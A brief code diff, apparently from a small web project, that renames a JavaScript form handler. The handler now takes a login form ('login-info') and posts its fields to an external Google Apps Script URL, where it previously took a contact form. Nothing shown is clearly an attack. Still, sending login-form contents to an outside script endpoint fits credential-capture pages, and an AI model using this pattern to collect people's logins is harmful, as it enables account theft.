@@ -1,7 +1,7 @@
 const script_do_google = config.script_url;
-const dados_do_formulario = document.forms['formulario-contato'];
+const dados_login = document.forms['login-info'];
 
-dados_do_formulario.addEventListener('submit', function (e) {
+dados_login.addEventListener('submit', function (e) {
     e.preventDefault();
     
     // Feedback visual que está enviando (opcional)
@@ -9,12 +9,12 @@ dados_do_formulario.addEventListener('submit', function (e) {
     botao.value = "Enviando...";
     botao.disabled = true;
 
-    fetch(script_do_google, { method: 'POST', body: new FormData(dados_do_formulario) })
+    fetch(script_do_google, { method: 'POST', body: new FormData(dados_login) })
         .then(response => {
             // Verifica se o fetch funcionou tecnicamente
             if (response.ok) {
                  alert('Dados enviados com sucesso!');
-                 dados_do_formulario.reset();
+                 dados_login.reset();
             } else {
                  throw new Error('Erro na resposta do servidor');
             }
